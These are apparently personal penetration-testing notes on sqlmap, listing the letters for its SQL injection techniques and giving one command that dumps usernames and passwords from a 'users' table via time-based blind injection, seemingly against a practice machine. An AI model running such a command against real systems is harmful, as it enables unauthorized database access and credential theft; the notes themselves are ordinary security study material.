---
title: "Sqlmap (Web)"
category: "web"
subcategory: "sqli"
type: "technique"
tags: ["my-notes", "personal", "sqli", "blind-sqli", "sqlmap", "web"]
summary: "Accepted answer seems incorrect from my point of view."
source:
  name: "Personal notes"
origin_path: "Web/sqlmap.md"
---

Accepted answer seems incorrect from my point of view. For a time based blind SQL injection, you should use letter `T`, for example `--technique=T` .

The list of techniques with its letters is as follows:

- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries
-> https://stackoverflow.com/questions/45463176/sqlmap-using-technique
## Commands
```
sqlmap -r request.txt --batch -T users -C username,password -D monitorsthree_db --dump --level=3 --risk=3 --threads=10 --skip=dbs,hostname --technique=T
```

---

*From your own notes: `Web/sqlmap.md`*
